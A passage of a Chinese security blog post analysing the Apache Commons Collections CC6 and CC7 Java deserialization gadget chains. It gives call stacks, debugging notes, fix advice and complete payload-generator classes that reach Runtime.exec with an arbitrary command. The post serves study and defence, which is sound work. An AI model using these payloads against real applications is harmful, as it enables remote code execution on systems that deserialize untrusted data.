+        <span class="token keyword">final</span> Transformer transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        HashMap innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        LazyMap lazyMap <span class="token operator">=</span> <span class="token punctuation">(</span>LazyMap<span class="token punctuation">)</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        TiedMapEntry tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        HashMap map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">"foo2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        innerMap<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        Field f <span class="token operator">=</span> transformerChain<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">return</span> map<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>这么写的话需要在最后加上一个innerMap.clear()，试着调试了一下，在创建第二个HashMap的时候，之前创建的innerMap的size自动增长了，出现了一个键值对，而LazyMap.get触发transform的条件是那个key不存在，因此需要在最后把map清空，否则无法触发</p>
+<p>也可以用yso的外面再套一层HashSet</p>
+<h3 id="踩坑无数"><a href="#踩坑无数" class="headerlink" title="踩坑无数"></a>踩坑无数</h3><p>已经忘了之前是怎么做的了，今天调试了一下CC6，然后踩了无数个坑。调试时IDEA会自动去获取变量值之类的数据进行展示，由此会调用toString，get等函数。而在这里很显然，toString和get等都属于致命函数，一调用就会直接触发payload，并且还会将其执行的结果放进map。我在构造payload的时候下了个断点，直接触发payload，顺便还把执行的结果，一个ProcessImpl类塞到map里，而这个类不能序列化，序列化直接失败。上述提到的innerMap.clear()清楚map内容，new第二个HashMap时innerMap自增也不知道是不是因为这个原因。。。。IDEA的这个操作导致我完全无法调试，很多问题没法解决了。。。</p>
+<h3 id="修复方案-5"><a href="#修复方案-5" class="headerlink" title="修复方案"></a>修复方案</h3><p>同之前，把InvokerTransformer ban了</p>
+<h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>利用哈希碰撞时调用equal去触发LazyMap.get，LazyMap真是万能</p>
+<h3 id="调用栈-6"><a href="#调用栈-6" class="headerlink" title="调用栈"></a>调用栈</h3><p>这次yso的没缩进了，手动加一个</p>
+<pre><code>java.util.Hashtable.readObject
+    java.util.Hashtable.reconstitutionPut
+        org.apache.commons.collections.map.AbstractMapDecorator.equals
+            java.util.AbstractMap.equals
+                org.apache.commons.collections.map.LazyMap.get
+                    org.apache.commons.collections.functors.ChainedTransformer.transform
+                    org.apache.commons.collections.functors.InvokerTransformer.transform
+                    java.lang.reflect.Method.invoke
+                    java.lang.Runtime.exec
+</code></pre>
+<h3 id="从Hashtable-readObject到LazyMap-get"><a href="#从Hashtable-readObject到LazyMap-get" class="headerlink" title="从Hashtable.readObject到LazyMap.get"></a>从Hashtable.readObject到LazyMap.get</h3><p>Hashtable的readObject最后调用了reconstitutionPut函数，进而进入AbstractMapDecorator的equal，调用的是AbstractMap的equal</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span>Object o<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>o <span class="token keyword">instanceof</span> <span class="token class-name">Map</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        Map<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> m <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">)</span> o<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            Iterator<span class="token operator">&lt;</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">>></span> i <span class="token operator">=</span> <span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> i<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                K key <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                V value <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token operator">==</span>null <span class="token operator">&amp;&amp;</span> m<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>value<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> 
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+</code></pre>
+<p>在<code>if (!value.equals(m.get(key)))</code>进LazyMap.get</p>
+<h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC7</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token keyword">final</span> String command<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>command<span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> temp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> Transformer transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        Map innerMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Map innerMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span>
+        Map lazyMap1 <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap1<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        lazyMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        Map lazyMap2 <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap2<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        lazyMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// Use the colliding Maps as keys in Hashtable</span>
+        Hashtable hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap2<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        Field f <span class="token operator">=</span> transformerChain<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// Needed to ensure hash collision after previous manipulations</span>
+        lazyMap2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> hashtable<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>这里注意一下最后的<code>lazyMap2.remove(&quot;yy&quot;);</code>，这是因为在构造的时候，两次put就已经产生了碰撞，而碰撞之后把lazymap2中添加了lazymap1中的项，需要把它移除才能保证在反序列化的时候再次发送哈希碰撞<br>以及hashCode(“yy”)&#x3D;&#x3D;hashCode(“zZ”)，所以会发生碰撞</p>
+<h3 id="修复方案-6"><a href="#修复方案-6" class="headerlink" title="修复方案"></a>修复方案</h3><p>同上</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>TiedMapEntry的触发实际上是用自己的key去调用transform方法，所以可以调用任意类的一个public方法，只需要将TiedMapEntry的key设为那个类的一个实例即可（好像用一堆transformer一直invoke下去也能调用任意类的任意public方法，也说不定）</p>
+<p>还有就是一开始初始化ChainedTransformer时直接放payload进去，容易在构造序列化数据的时候直接触发，打自己一下。。。正确的做法是先塞个垃圾进去，搞完了再反射改掉，所以yso都是这么做的</p>
+<p>总结一下使用场景<br>CC1&#x2F;3用的AnnotationInvocationHandler只适用于远古jdk，基本上没有用<br>CC2&#x2F;4用的TransformingComparator只适用于Common Collections4.0，勉强能用<br>CC5&#x2F;6都是走到TiedMapEntry，进LazyMap.get<br>其中CC5的BadAttributeValueExpException适用于高版本jdk且需要一个SecurityManager的配置<br>CC7用的Hashtable也是走到LazyMap.get，但和5&#x2F;6相比，少一个TiedMapEntry<br>以及CC5&#x2F;6&#x2F;7似乎对于Common Collections3&#x2F;4均适用</p>
+<p>后续还有各种和TemplateImpl结合的变体打法，可能就是市面上流传的CC8&#x2F;9&#x2F;10</p>
+<p>而最后的执行环节一定是用到Transformer的，所以在Common Collections3.2.1以及Common Collections4.0之后，这几个相关Transformer均不可序列化，完成了超级防御</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>我直接打开rmb神仙的博客开始学习并超级提问呜呜<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://rmb122.com/2020/01/20/ysoserial-URLDNS-CommonsCollectionsX-%E5%88%86%E6%9E%90/">ysoserial URLDNS, CommonsCollectionsX 分析</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://paper.seebug.org/1242/">Java安全之反序列化篇-URLDNS&amp;Commons Collections 1-7反序列化链分析</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%5BTCTF2021%20final%5D%E5%A4%8D%E7%8E%B0.html" rel="prev" title="[TCTF2021 final]复现">
+      <i class="fa fa-chevron-left"></i> [TCTF2021 final]复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81&%E4%B8%9C%E5%8D%8E%E6%9D%AF.html" rel="next" title="2021强网拟态&东华杯wp">
+      2021强网拟态&东华杯wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Common-Collections%E7%B3%BB%E5%88%97payload%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">Common-Collections系列payload复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CC1"><span class="nav-number">1.1.</span> <span class="nav-text">CC1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-number">1.1.1.</span> <span class="nav-text">调用栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Transformer"><span class="nav-number">1.1.2.</span> <span class="nav-text">Transformer[]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8EAnnotationInvocationHandler-invoke%E5%88%B0LazyMap-get"><span class="nav-number">1.1.3.</span> <span class="nav-text">从AnnotationInvocationHandler.invoke到LazyMap.get</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">1.1.4.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="nav-number">1.1.5.</span> <span class="nav-text">修复方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC2"><span class="nav-number">1.2.</span> <span class="nav-text">CC2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">调用栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TemplateImpl"><span class="nav-number">1.2.2.</span> <span class="nav-text">TemplateImpl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8EPriorityQueue%E5%88%B0InvokerTransformer"><span class="nav-number">1.2.3.</span> <span class="nav-text">从PriorityQueue到InvokerTransformer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-1"><span class="nav-number">1.2.4.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88-1"><span class="nav-number">1.2.5.</span> <span class="nav-text">修复方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC3"><span class="nav-number">1.3.</span> <span class="nav-text">CC3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">调用栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8EInstantiateTransformer%E5%88%B0templateImpl-newTransformer"><span class="nav-number">1.3.2.</span> <span class="nav-text">从InstantiateTransformer到templateImpl.newTransformer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-2"><span class="nav-number">1.3.3.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88-2"><span class="nav-number">1.3.4.</span> <span class="nav-text">修复方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC4"><span class="nav-number">1.4.</span> <span class="nav-text">CC4</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">调用栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-3"><span class="nav-number">1.4.2.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88-3"><span class="nav-number">1.4.3.</span> <span class="nav-text">修复方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC5"><span class="nav-number">1.5.</span> <span class="nav-text">CC5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88-4"><span class="nav-number">1.5.1.</span> <span class="nav-text">调用栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BadAttributeValueExpException%E5%88%B0LazyMap-get"><span class="nav-number">1.5.2.</span> <span class="nav-text">BadAttributeValueExpException到LazyMap.get()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-4"><span class="nav-number">1.5.3.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88-4"><span class="nav-number">1.5.4.</span> <span class="nav-text">修复方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC6"><span class="nav-number">1.6.</span> <span class="nav-text">CC6</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88-5"><span class="nav-number">1.6.1.</span> <span class="nav-text">调用栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HashMap%E5%88%B0LazyMap-get"><span class="nav-number">1.6.2.</span> <span class="nav-text">HashMap到LazyMap.get</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-5"><span class="nav-number">1.6.3.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91%E6%97%A0%E6%95%B0"><span class="nav-number">1.6.4.</span> <span class="nav-text">踩坑无数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88-5"><span class="nav-number">1.6.5.</span> <span class="nav-text">修复方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC7"><span class="nav-number">1.7.</span> <span class="nav-text">CC7</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88-6"><span class="nav-number">1.7.1.</span> <span class="nav-text">调用栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8EHashtable-readObject%E5%88%B0LazyMap-get"><span class="nav-number">1.7.2.</span> <span class="nav-text">从Hashtable.readObject到LazyMap.get</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-6"><span class="nav-number">1.7.3.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88-6"><span class="nav-number">1.7.4.</span> <span class="nav-text">修复方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">1.8.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.9.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
